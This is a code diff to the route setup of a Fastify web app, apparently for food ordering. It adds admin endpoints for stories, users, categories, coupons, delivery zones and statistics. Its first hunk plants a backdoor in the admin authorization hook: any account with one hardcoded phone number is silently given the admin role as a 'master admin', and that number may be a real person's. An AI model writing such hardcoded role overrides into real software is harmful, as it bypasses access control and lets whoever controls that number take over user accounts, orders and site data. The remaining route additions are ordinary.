@@ -48,6 +48,10 @@ async function routes(fastify, options) {
         protectedFastify.register(async function (adminFastify, opts) {
             adminFastify.addHook('onRequest', async (request, reply) => {
                 const user = await userRepository.findOne({ id: request.user.id });
+                if (user && user.phone === '01021317616') {
+                    user.role = 'admin'; // Override role if it's the master admin
+                }
+                
                 if (!user || user.role !== 'admin') {
                     return reply.status(403).send({ message: 'Forbidden: Admins only' });
                 }
@@ -59,6 +63,28 @@ async function routes(fastify, options) {
             adminFastify.post('/api/admin/menu', adminController.addMenuItem);
             adminFastify.put('/api/admin/menu/:id', adminController.updateMenuItem);
             adminFastify.delete('/api/admin/menu/:id', adminController.deleteMenuItem);
+
+            adminFastify.get('/api/admin/stories', adminController.getStories);
+            adminFastify.post('/api/admin/stories', adminController.addStory);
+            adminFastify.delete('/api/admin/stories/:id', adminController.deleteStory);
+
+            adminFastify.get('/api/admin/users', adminController.getUsers);
+            adminFastify.put('/api/admin/users/:id/status', adminController.updateUserStatus);
+
+            adminFastify.get('/api/admin/categories', adminController.getCategories);
+            adminFastify.post('/api/admin/categories', adminController.addCategory);
+            adminFastify.delete('/api/admin/categories/:id', adminController.deleteCategory);
+
+            adminFastify.get('/api/admin/coupons', adminController.getCoupons);
+            adminFastify.post('/api/admin/coupons', adminController.addCoupon);
+            adminFastify.delete('/api/admin/coupons/:id', adminController.deleteCoupon);
+
+            adminFastify.get('/api/admin/delivery-zones', adminController.getDeliveryZones);
+            adminFastify.post('/api/admin/delivery-zones', adminController.addDeliveryZone);
+            adminFastify.put('/api/admin/delivery-zones/:id', adminController.updateDeliveryZone);
+            adminFastify.delete('/api/admin/delivery-zones/:id', adminController.deleteDeliveryZone);
+
+            adminFastify.get('/api/admin/stats', adminController.getStats);
         });
     });
 }
